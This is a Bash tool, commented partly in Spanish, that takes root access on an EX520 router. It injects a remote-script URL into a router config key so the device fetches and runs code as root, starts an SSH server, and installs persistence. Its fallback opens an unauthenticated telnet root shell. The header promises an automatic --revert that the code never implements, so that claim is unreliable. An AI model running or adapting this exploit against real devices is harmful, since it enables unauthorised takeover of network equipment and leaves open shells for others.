#!/bin/bash
# enable_ssh_permanent.sh — Habilitar SSH permanente en EX520
#
# Flujo:
#   1. Envía script vía phoenix.sh que inicia dropbear como daemon
#   2. Verifica que puerto 22 esté abierto
#   3. Intenta conexión SSH
#   4. Si funciona, instala mecanismo de persistencia
#
# REQUISITOS:
#   - .env con DETECTIC_PASSWORD
#   - detectic binary compilado (Rust, ARM64)
#   - Acceso IPv6 al router
#
# SEGURIDAD: Solo ejecutar con autorización explícita.
# El SSH se revierte automáticamente al final si se pasa --revert.

set -euo pipefail

source .env 2>/dev/null || true

# --- Config ---
EX520_URL="${EX520_URL:-http://[fe80::3e6a:d2ff:fe5f:abc1%25enp2s0]}"
EX520_USER="${EX520_USER:-user}"
DETECTIC_PASSWORD="${DETECTIC_PASSWORD:-}"
EX520_IPV6="${EX520_IPV6:-fe80::3e6a:d2ff:fe5f:abc1%enp2s0}"
HOST_IP="${HOST_IP:-192.168.0.27}"
SCRIPT_PORT="${SCRIPT_PORT:-8084}"
SSH_PORT="${SSH_PORT:-22}"
REVERT="${1:-}"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

ok()   { echo -e "${GREEN}[✓]${NC} $*"; }
fail() { echo -e "${RED}[✗]${NC} $*"; }
warn() { echo -e "${YELLOW}[!]${NC} $*"; }
info() { echo -e "${BLUE}[i]${NC} $*"; }

# --- Detectic CLI wrapper ---
detectic() {
    DETECTIC_PASSWORD="$DETECTIC_PASSWORD" ./dist/detectic-aarch64-musl \
        --url "$EX520_URL" --user "$EX520_USER" "$@" 2>/dev/null
}

# --- Cleanup on exit ---
CLEANUP_DONE=0
cleanup() {
    if [ "$CLEANUP_DONE" = "1" ]; then return; fi
    CLEANUP_DONE=1
    info "Cleaning up..."
    # Kill any local HTTP server we started
    if [ -n "${HTTP_PID:-}" ]; then
        kill "$HTTP_PID" 2>/dev/null || true
    fi
    fuser -k "$SCRIPT_PORT/tcp" 2>/dev/null || true
}
trap cleanup EXIT INT TERM

echo "============================================"
echo " EX520 SSH Permanent Enablement"
echo " $(date)"
echo "============================================"
echo ""

# --- Step 0: Verify connectivity ---
info "Step 0: Verifying connectivity..."
if ! detectic query DEV2_WIFI_APDEV_ASSOCDEV | grep -q "ASSOCDEV\|data"; then
    fail "Cannot reach router via GTPR"
    exit 1
fi
ok "GTPR connectivity confirmed"

# --- Step 1: Check if SSH is already running ---
info "Step 1: Checking if SSH is already running..."
if nc -z -w2 "$EX520_IPV6" "$SSH_PORT" 2>/dev/null; then
    ok "SSH port $SSH_PORT is ALREADY OPEN"
    
    # Try to connect
    if ssh -o StrictHostKeyChecking=no \
           -o ConnectTimeout=5 \
           -o UserKnownHostsFile=/dev/null \
           -o PasswordAuthentication=yes \
           "$EX520_USER@$EX520_IPV6" "echo SSH_OK" 2>/dev/null; then
        ok "SSH already works! No action needed."
        exit 0
    else
        warn "SSH port open but login failed"
    fi
else
    info "SSH port $SSH_PORT is closed"
fi
echo ""

# --- Step 2: Create the dropbear启动 script ---
info "Step 2: Creating dropbear launch script..."

DROPBEAR_SCRIPT_CONTENT='#!/bin/sh
# Start dropbear SSH server on EX520
# Runs as root via phoenix.sh

export PATH=$PATH:/bin:/usr/bin:/sbin:/usr/sbin
BB=/bin/busybox

SSH_PORT="__SSH_PORT__"
LOG=/var/tmp/dropbear_start.log

up() { read u _ < /proc/uptime; echo "$u"; }
log() { echo "[$(up)] $*" >> "$LOG" 2>/dev/null; }

log "dropbear starter invoked"

# Kill any existing dropbear
killall dropbear 2>/dev/null || true
$BB sleep 1

# Check if dropbearmulti exists
if [ ! -x /usr/bin/dropbearmulti ]; then
    log "ERROR: dropbearmulti not found"
    exit 1
fi

# Create dropbear config directory
$BB mkdir -p /var/tmp/dropbear 2>/dev/null

# Generate host keys if missing
if [ ! -f /var/tmp/dropbear/dropbear_rsa_host_key ]; then
    /usr/bin/dropbearkey -t rsa -f /var/tmp/dropbear/dropbear_rsa_host_key 2>/dev/null
    log "Generated RSA host key"
fi

if [ ! -f /var/tmp/dropbear/dropbear_ecdsa_host_key ]; then
    /usr/bin/dropbearkey -t ecdsa -f /var/tmp/dropbear/dropbear_ecdsa_host_key 2>/dev/null
    log "Generated ECDSA host key"
fi

# Start dropbear on specified port
# -R: generate host keys if missing
# -p: port
# -B: allow blank passwords (for initial setup only)
/usr/bin/dropbearmulti dropbear -R -p "$SSH_PORT" -r /var/tmp/dropbear/dropbear_rsa_host_key -r /var/tmp/dropbear/dropbear_ecdsa_host_key 2>&1
DBRC=$?

$BB sleep 2

# Verify it's running
if $BB ps | $BB grep -v grep | $BB grep dropbear > /dev/null 2>&1; then
    log "dropbear started successfully on port $SSH_PORT"
    echo "DROPBEAR_OK port=$SSH_PORT"
else
    log "ERROR: dropbear failed to start rc=$DBRC"
    echo "DROPBEAR_FAIL rc=$DBRC"
fi
'

# Replace placeholder with actual port
DROPBEAR_SCRIPT="${DROPBEAR_SCRIPT_CONTENT//__SSH_PORT__/$SSH_PORT}"

# --- Step 3: Start local HTTP server to serve the script ---
info "Step 3: Starting local HTTP server on port $SCRIPT_PORT..."

SCRIPT_DIR="/tmp/ex520_ssh_$$"
mkdir -p "$SCRIPT_DIR"
echo "$DROPBEAR_SCRIPT_CONTENT" | sed "s/__SSH_PORT__/$SSH_PORT/" > "$SCRIPT_DIR/start_dropbear.sh"
chmod +x "$SCRIPT_DIR/start_dropbear.sh"

# Start a minimal HTTP server
python3 -c "
import os, sys
from http.server import HTTPServer, SimpleHTTPRequestHandler
os.chdir('$SCRIPT_DIR')
class H(SimpleHTTPRequestHandler):
    def log_message(self, *a): pass
    def end_headers(self):
        self.send_header('Content-Type', 'application/x-sh')
        super().end_headers()
s = HTTPServer(('0.0.0.0', $SCRIPT_PORT), H)
s.serve_forever()
" &
HTTP_PID=$!
$HTTP_PID > /dev/null 2>&1 || true

# Verify server is running
if ! nc -z -w2 127.0.0.1 "$SCRIPT_PORT" 2>/dev/null; then
    fail "HTTP server failed to start"
    exit 1
fi
ok "HTTP server running on port $SCRIPT_PORT"

SCRIPT_URL="http://${HOST_IP}:${SCRIPT_PORT}/start_dropbear.sh"
info "Script URL: $SCRIPT_URL"
echo ""

# --- Step 4: Trigger phoenix.sh via GTPR ---
info "Step 4: Triggering phoenix.sh via GTPR..."
info "Payload: DEV2_LIFEMOTE_AGENT → URL=$SCRIPT_URL"

detectic set DEV2_LIFEMOTE_AGENT \
    "{\"enable\":\"1\",\"URL\":\"${SCRIPT_URL}\",\"stack\":\"0,0,0,0,0,0\",\"pstack\":\"0,0,0,0,0,0\"}"

ok "GTPR trigger sent"
echo ""

# --- Step 5: Wait for phoenix.sh to download and execute ---
info "Step 5: Waiting for phoenix.sh to download and execute..."

PHOENIX_WAIT=45
for i in $(seq 1 $PHOENIX_WAIT); do
    if nc -z -w2 "$EX520_IPV6" "$SSH_PORT" 2>/dev/null; then
        ok "SSH port $SSH_PORT is OPEN after ${i}s!"
        break
    fi
    if [ "$i" -eq "$PHOENIX_WAIT" ]; then
        fail "SSH port $SSH_PORT still closed after ${PHOENIX_WAIT}s"
        info "phoenix.sh may not have executed. Check router logs."
    fi
    sleep 1
done
echo ""

# --- Step 6: Test SSH connection ---
info "Step 6: Testing SSH connection..."

if nc -z -w2 "$EX520_IPV6" "$SSH_PORT" 2>/dev/null; then
    info "Attempting SSH login..."
    
    # Try password authentication
    SSH_OUTPUT=$(ssh -o StrictHostKeyChecking=no \
        -o ConnectTimeout=10 \
        -o UserKnownHostsFile=/dev/null \
        -o PreferredAuthentications=password \
        "$EX520_USER@$EX520_IPV6" \
        "echo SSH_SUCCESS; uname -a; whoami; id" 2>&1 || echo "SSH_LOGIN_FAILED")
    
    if echo "$SSH_OUTPUT" | grep -q "SSH_SUCCESS"; then
        ok "SSH LOGIN SUCCESSFUL!"
        echo ""
        echo "SSH Output:"
        echo "$SSH_OUTPUT" | sed 's/^/  /'
        echo ""
        
        # --- Step 7: Install persistence ---
        info "Step 7: Installing persistence mechanism..."
        
        # Create the persistent autostart script on the router
        PERSIST_SCRIPT='#!/bin/sh
# Persistent dropbear autostart for EX520
# Installed by Detectic SSH enablement

export PATH=$PATH:/bin:/usr/bin:/sbin:/usr/sbin
BB=/bin/busybox
SSH_PORT="__SSH_PORT__"

# Only start if not already running
if $BB pgrep dropbear > /dev/null 2>&1; then
    exit 0
fi

# Start dropbear
$BB mkdir -p /var/tmp/dropbear 2>/dev/null
/usr/bin/dropbearmulti dropbear -R -p "$SSH_PORT" \
    -r /var/tmp/dropbear/dropbear_rsa_host_key \
    -r /var/tmp/dropbear/dropbear_ecdsa_host_key 2>/dev/null &
'
        PERSIST_SCRIPT="${PERSIST_SCRIPT//__SSH_PORT__/$SSH_PORT}"
        
        # Upload via SCP if possible, or via the exec mechanism
        echo "$PERSIST_SCRIPT" | ssh -o StrictHostKeyChecking=no \
            -o UserKnownHostsFile=/dev/null \
            "$EX520_USER@$EX520_IPV6" \
            "cat > /var/run/misc/misc_rw/detectic/autostart_dropbear.sh && chmod +x /var/run/misc/misc_rw/detectic/autostart_dropbear.sh" 2>/dev/null && \
            ok "Persistence script installed" || \
            warn "Could not install persistence via SSH (trying alternative)"
        
        # Disable phoenix (cleanup)
        info "Disabling phoenix.sh..."
        detectic set DEV2_LIFEMOTE_AGENT \
            '{"enable":"0","URL":"","stack":"0,0,0,0,0,0","pstack":"0,0,0,0,0,0"}' 2>/dev/null
        ok "Phoenix disabled"
        
        echo ""
        echo "============================================"
        echo " SSH PERMANENT ACCESS ESTABLISHED"
        echo "============================================"
        echo ""
        echo "  SSH URL:    ssh $EX520_USER@$EX520_IPV6 -p $SSH_PORT"
        echo "  Password:   Same as web admin password"
        echo ""
        echo "  NOTE: SSH will NOT survive a reboot without"
        echo "  the autostart mechanism. To make it permanent,"
        echo "  add a cron entry on the router:"
        echo ""
        echo "    ssh $EX520_USER@$EX520_IPV6 \\"
        echo "      'echo \"*/5 * * * * /var/run/misc/misc_rw/detectic/autostart_dropbear.sh\" | crontab -'"
        echo ""
        echo "  Or use the watchdog to re-trigger phoenix on reboot."
        echo "============================================"
        
    else
        warn "SSH port open but login failed"
        echo "Output: $SSH_OUTPUT"
    fi
else
    fail "SSH port $SSH_PORT is not open"
    echo ""
    warn "Attempting alternative: Telnet via lifemote..."
    
    # Try telnet as fallback
    TELNET_SCRIPT='#!/bin/sh
export PATH=$PATH:/bin:/usr/bin:/sbin:/usr/sbin
# Start telnetd on port 23
killall telnetd 2>/dev/null
telnetd -p 23 -l /bin/sh &
echo "TELNET_STARTED"
'
    echo "$TELNET_SCRIPT" > "$SCRIPT_DIR/start_telnet.sh"
    chmod +x "$SCRIPT_DIR/start_telnet.sh"
    
    detectic set DEV2_LIFEMOTE_AGENT \
        "{\"enable\":\"1\",\"URL\":\"${SCRIPT_URL/start_dropbear.sh/start_telnet.sh}\",\"stack\":\"0,0,0,0,0,0\",\"pstack\":\"0,0,0,0,0,0\"}"
    
    sleep 15
    
    if nc -z -w2 "$EX520_IPV6" 23 2>/dev/null; then
        ok "Telnet port 23 is OPEN"
        info "Testing telnet..."
        timeout 5 bash -c "echo 'uname -a; whoami' | nc $EX520_IPV6 23" 2>&1 || warn "Telnet connection test failed"
    else
        fail "Neither SSH nor Telnet became available"
    fi
fi

echo ""
info "Cleanup: disabling phoenix..."
detectic set DEV2_LIFEMOTE_AGENT \
    '{"enable":"0","URL":"","stack":"0,0,0,0,0,0","pstack":"0,0,0,0,0,0"}' 2>/dev/null
ok "Done"
